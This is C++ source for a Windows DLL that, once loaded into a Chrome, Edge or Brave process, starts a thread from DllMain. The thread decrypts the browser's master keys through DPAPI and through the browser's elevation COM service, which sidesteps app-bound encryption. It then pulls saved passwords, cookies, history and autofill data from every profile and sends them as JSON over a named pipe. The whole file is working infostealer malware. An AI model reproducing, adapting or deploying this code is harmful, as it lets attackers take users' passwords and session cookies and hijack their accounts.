#include <windows.h>
#include <bcrypt.h>
#include <wincrypt.h>
#include <objbase.h>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include "../../includes/json.hpp"
#include "../../includes/sqlite3.h"
#include "../../includes/base64.h"

using json = nlohmann::json;
namespace fs = std::filesystem;

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")

enum class Browser { Chrome, Edge, Brave };

const GUID CLSID_CHROME_ELEVATOR = { 0x708860E0, 0xF641, 0x4611, { 0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B } };
const GUID IID_CHROME_IELEVATOR1 = { 0x463ABECF, 0x410D, 0x407F, { 0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8 } };
const GUID IID_CHROME_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } };

const GUID CLSID_EDGE_ELEVATOR = { 0x1FCBE96C, 0x1697, 0x43AF, { 0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67 } };
const GUID IID_EDGE_IELEVATOR1 = { 0xC9C2B807, 0x7731, 0x4F34, { 0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B } };
const GUID IID_EDGE_IELEVATOR2 = { 0x8F7B6792, 0x784D, 0x4047, { 0x84, 0x5D, 0x17, 0x82, 0xEF, 0xBE, 0xF2, 0x05 } };

const GUID CLSID_BRAVE_ELEVATOR = { 0x576B31AF, 0x6369, 0x4B6B, { 0x85, 0x60, 0xE4, 0xB2, 0x03, 0xA9, 0x7A, 0x8B } };
const GUID IID_BRAVE_IELEVATOR1 = { 0xF396861E, 0x0C8E, 0x4C71, { 0x82, 0x56, 0x2F, 0xAE, 0x6D, 0x75, 0x9C, 0xE9 } };
const GUID IID_BRAVE_IELEVATOR2 = { 0x1BF5208B, 0x295F, 0x4992, { 0xB5, 0xF4, 0x3A, 0x9B, 0xB6, 0x49, 0x48, 0x38 } };

struct IElevator : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, DWORD, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(DWORD, BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(BSTR, BSTR*, DWORD*) = 0;
};

struct IEdgeElevator : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod1() = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod2() = 0;
    virtual HRESULT STDMETHODCALLTYPE EdgeBaseMethod3() = 0;
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, DWORD, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(DWORD, BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(BSTR, BSTR*, DWORD*) = 0;
};

std::vector<unsigned char> decrypt_dpapi(const std::vector<unsigned char>& data) {
    DATA_BLOB input = { (DWORD)data.size(), (BYTE*)data.data() };
    DATA_BLOB output = { 0, nullptr };
    if (CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr, 0, &output)) {
        std::vector<unsigned char> res(output.pbData, output.pbData + output.cbData);
        LocalFree(output.pbData);
        return res;
    }
    return {};
}

std::vector<unsigned char> aes_gcm_decrypt(const std::vector<unsigned char>& key, const std::vector<unsigned char>& data) {
    if (data.size() < 15) return {};
    BCRYPT_ALG_HANDLE h_alg = nullptr;
    BCRYPT_KEY_HANDLE h_key = nullptr;
    std::vector<unsigned char> res;
    if (BCryptOpenAlgorithmProvider(&h_alg, BCRYPT_AES_ALGORITHM, nullptr, 0) == 0) {
        BCryptSetProperty(h_alg, BCRYPT_CHAINING_MODE, (BYTE*)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (BCryptGenerateSymmetricKey(h_alg, &h_key, nullptr, 0, (BYTE*)key.data(), (DWORD)key.size(), 0) == 0) {
            BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
            BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
            auth_info.pbNonce = (BYTE*)data.data() + 3;
            auth_info.cbNonce = 12;
            auth_info.pbTag = (BYTE*)data.data() + data.size() - 16;
            auth_info.cbTag = 16;
            DWORD res_size = 0;
            DWORD ciphertext_len = (DWORD)data.size() - 15 - 16;
            res.resize(ciphertext_len);
            if (BCryptDecrypt(h_key, (BYTE*)data.data() + 15, ciphertext_len, &auth_info, nullptr, 0, res.data(), (DWORD)res.size(), &res_size, 0) != 0) res.clear();
            BCryptDestroyKey(h_key);
        }
        BCryptCloseAlgorithmProvider(h_alg, 0);
    }
    return res;
}

std::vector<unsigned char> decrypt_with_elevator(const std::vector<unsigned char>& encrypted_blob, Browser browser) {
    CLSID clsid;
    std::vector<GUID> iids;
    if (browser == Browser::Chrome) { clsid = CLSID_CHROME_ELEVATOR; iids = { IID_CHROME_IELEVATOR2, IID_CHROME_IELEVATOR1 }; }
    else if (browser == Browser::Edge) { clsid = CLSID_EDGE_ELEVATOR; iids = { IID_EDGE_IELEVATOR2, IID_EDGE_IELEVATOR1 }; }
    else { clsid = CLSID_BRAVE_ELEVATOR; iids = { IID_BRAVE_IELEVATOR2, IID_BRAVE_IELEVATOR1 }; }
    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    std::vector<unsigned char> res;
    IUnknown* elevator = nullptr;
    HRESULT hr = E_FAIL;
    for (const auto& iid : iids) {
        hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, (void**)&elevator);
        if (SUCCEEDED(hr)) break;
    }
    if (SUCCEEDED(hr)) {
        BSTR bstr_enc = SysAllocStringByteLen((const char*)encrypted_blob.data(), (UINT)encrypted_blob.size());
        BSTR bstr_dec = nullptr;
        DWORD last_error = 0;
        if (browser == Browser::Edge) hr = ((IEdgeElevator*)elevator)->DecryptData(bstr_enc, &bstr_dec, &last_error);
        else hr = ((IElevator*)elevator)->DecryptData(bstr_enc, &bstr_dec, &last_error);
        if (SUCCEEDED(hr) && bstr_dec) {
            res.assign((unsigned char*)bstr_dec, (unsigned char*)bstr_dec + SysStringByteLen(bstr_dec));
            SysFreeString(bstr_dec);
        }
        SysFreeString(bstr_enc);
        elevator->Release();
    }
    CoUninitialize();
    return res;
}

Browser get_browser() {
    WCHAR path[MAX_PATH];
    GetModuleFileNameW(nullptr, path, MAX_PATH);
    std::wstring s = path;
    for (auto& c : s) c = towlower(c);
    if (s.find(L"msedge.exe") != std::wstring::npos) return Browser::Edge;
    if (s.find(L"brave.exe") != std::wstring::npos) return Browser::Brave;
    return Browser::Chrome;
}

void do_work() {
    Browser browser = get_browser();
    char* user_profile_env = nullptr;
    size_t env_size = 0;
    _dupenv_s(&user_profile_env, &env_size, "USERPROFILE");
    if (!user_profile_env) return;
    fs::path user_profile = user_profile_env;
    free(user_profile_env);

    fs::path data_path;
    if (browser == Browser::Chrome) data_path = user_profile / "AppData/Local/Google/Chrome/User Data";
    else if (browser == Browser::Edge) data_path = user_profile / "AppData/Local/Microsoft/Edge/User Data";
    else data_path = user_profile / "AppData/Local/BraveSoftware/Brave-Browser/User Data";

    std::ifstream local_state_f(data_path / "Local State");
    json local_state_json = json::parse(local_state_f, nullptr, false);

    std::vector<unsigned char> v10_key, v20_key;
    if (!local_state_json.is_discarded()) {
        if (local_state_json.contains("os_crypt") && local_state_json["os_crypt"].contains("encrypted_key")) {
            std::string key_b64 = local_state_json["os_crypt"]["encrypted_key"];
            auto decoded = base64_decode(key_b64);
            if (decoded.size() > 5 && std::equal(decoded.begin(), decoded.begin() + 5, "DPAPI")) {
                v10_key = decrypt_dpapi(std::vector<unsigned char>(decoded.begin() + 5, decoded.end()));
            }
        }
        std::string v20_b64 = "";
        if (local_state_json.contains("app_bound_encrypted_key")) v20_b64 = local_state_json["app_bound_encrypted_key"];
        else if (local_state_json.contains("os_crypt") && local_state_json["os_crypt"].contains("app_bound_encrypted_key")) v20_b64 = local_state_json["os_crypt"]["app_bound_encrypted_key"];

        if (!v20_b64.empty()) {
            auto decoded = base64_decode(v20_b64);
            std::vector<unsigned char> blob;
            if (decoded.size() > 4 && std::equal(decoded.begin(), decoded.begin() + 4, "APPB")) blob.assign(decoded.begin() + 4, decoded.end());
            else blob = decoded;
            v20_key = decrypt_with_elevator(blob, browser);
        }
    }

    std::vector<std::string> profiles = { "Default" };
    if (fs::exists(data_path)) {
        for (const auto& entry : fs::directory_iterator(data_path)) {
            if (entry.is_directory()) {
                std::string name = entry.path().filename().string();
                if (name.find("Profile ") == 0) profiles.push_back(name);
            }
        }
    }

    json collected = json::array();
    fs::path temp_dir = user_profile / "Desktop/chrome_db";
    fs::create_directories(temp_dir);

    for (const auto& profile : profiles) {
        fs::path p_path = data_path / profile;
        json p_data;
        p_data["name"] = profile;
        p_data["passwords"] = json::array();
        p_data["cookies"] = json::array();
        p_data["history"] = json::array();
        p_data["autofill"] = json::array();

        // Passwords
        fs::path db_path = p_path / "Login Data";
        fs::path tmp_db = temp_dir / "pass.tmp";
        if (fs::exists(db_path) && fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing)) {
            sqlite3* db;
            if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT origin_url, username_value, password_value FROM logins", -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
                        const char* user_ptr = (const char*)sqlite3_column_text(stmt, 1);
                        std::string url = url_ptr ? url_ptr : "";
                        std::string user = user_ptr ? user_ptr : "";
                        const void* blob = sqlite3_column_blob(stmt, 2);
                        int blob_size = sqlite3_column_bytes(stmt, 2);
                        std::vector<unsigned char> enc_pass((unsigned char*)blob, (unsigned char*)blob + blob_size);

                        const auto& key = (enc_pass.size() >= 3 && std::equal(enc_pass.begin(), enc_pass.begin() + 3, "v20")) ? v20_key : v10_key;
                        if (!key.empty()) {
                            auto dec = aes_gcm_decrypt(key, enc_pass);
                            p_data["passwords"].push_back({{"url", url}, {"username", user}, {"password", std::string(dec.begin(), dec.end())}});
                        }
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            fs::remove(tmp_db);
        }

        // Cookies
        db_path = p_path / "Network/Cookies";
        tmp_db = temp_dir / "cook.tmp";
        if (fs::exists(db_path) && fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing)) {
            sqlite3* db;
            if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value FROM cookies", -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* host_ptr = (const char*)sqlite3_column_text(stmt, 0);
                        const char* name_ptr = (const char*)sqlite3_column_text(stmt, 1);
                        std::string host = host_ptr ? host_ptr : "";
                        std::string name = name_ptr ? name_ptr : "";
                        const void* blob = sqlite3_column_blob(stmt, 2);
                        int blob_size = sqlite3_column_bytes(stmt, 2);
                        std::vector<unsigned char> enc_val((unsigned char*)blob, (unsigned char*)blob + blob_size);

                        bool is_v20 = enc_val.size() >= 3 && std::equal(enc_val.begin(), enc_val.begin() + 3, "v20");
                        const auto& key = is_v20 ? v20_key : v10_key;
                        if (!key.empty()) {
                            auto dec = aes_gcm_decrypt(key, enc_val);
                            if (is_v20 && dec.size() > 32) dec.erase(dec.begin(), dec.begin() + 32);
                            p_data["cookies"].push_back({{"host", host}, {"name", name}, {"value", std::string(dec.begin(), dec.end())}});
                        }
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            fs::remove(tmp_db);
        }

        // History
        db_path = p_path / "History";
        tmp_db = temp_dir / "hist.tmp";
        if (fs::exists(db_path) && fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing)) {
            sqlite3* db;
            if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT url, title, visit_count FROM urls LIMIT 500", -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* url_ptr = (const char*)sqlite3_column_text(stmt, 0);
                        const char* title_ptr = (const char*)sqlite3_column_text(stmt, 1);
                        p_data["history"].push_back({
                            {"url", url_ptr ? url_ptr : ""},
                            {"title", title_ptr ? title_ptr : ""},
                            {"visit_count", sqlite3_column_int(stmt, 2)}
                        });
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            fs::remove(tmp_db);
        }

        // Autofill
        db_path = p_path / "Web Data";
        tmp_db = temp_dir / "web.tmp";
        if (fs::exists(db_path) && fs::copy_file(db_path, tmp_db, fs::copy_options::overwrite_existing)) {
            sqlite3* db;
            if (sqlite3_open(tmp_db.string().c_str(), &db) == SQLITE_OK) {
                sqlite3_stmt* stmt;
                if (sqlite3_prepare_v2(db, "SELECT name, value FROM autofill", -1, &stmt, nullptr) == SQLITE_OK) {
                    while (sqlite3_step(stmt) == SQLITE_ROW) {
                        const char* name_ptr = (const char*)sqlite3_column_text(stmt, 0);
                        const char* val_ptr = (const char*)sqlite3_column_text(stmt, 1);
                        p_data["autofill"].push_back({
                            {"name", name_ptr ? name_ptr : ""},
                            {"value", val_ptr ? val_ptr : ""}
                        });
                    }
                    sqlite3_finalize(stmt);
                }
                sqlite3_close(db);
            }
            fs::remove(tmp_db);
        }
        collected.push_back(p_data);
    }
    fs::remove_all(temp_dir);

    for (int i = 0; i < 30; i++) {
        HANDLE pipe = CreateFileW(L"\\\\.\\pipe\\chrome_extractor", GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        if (pipe != INVALID_HANDLE_VALUE) {
            std::string s = collected.dump();
            DWORD written;
            WriteFile(pipe, s.c_str(), (DWORD)s.size(), &written, nullptr);
            CloseHandle(pipe);
            break;
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
    }
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        std::thread(do_work).detach();
    }
    return TRUE;
}
